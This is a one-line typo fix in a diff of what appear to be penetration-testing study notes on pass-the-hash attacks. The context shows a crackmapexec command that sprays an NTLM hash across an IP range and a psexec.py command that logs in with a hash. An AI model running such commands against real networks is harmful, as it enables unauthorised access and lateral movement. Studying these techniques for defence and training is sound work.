@@ -229,7 +229,7 @@
 
 * NTLM hashes can be passed around, NTLMv2 hashes **can not** be passed around
 * copy second part of the hash then run it in crackmapexec `crackmapexec smb <IP-range> -u <username> -H <paste_hash_here> --local-auth`
-* see it's gonna try to pass it around the network and gain access, green plus sign indicates in succeed
+* see it's gonna try to pass it around the network and gain access, green plus sign indicates if it succeeded
 * `psexec.py "frank castle":@192.168.57.141 -hashes <HASH here, first and second part of hash needed>`
 
 ### Mitigations
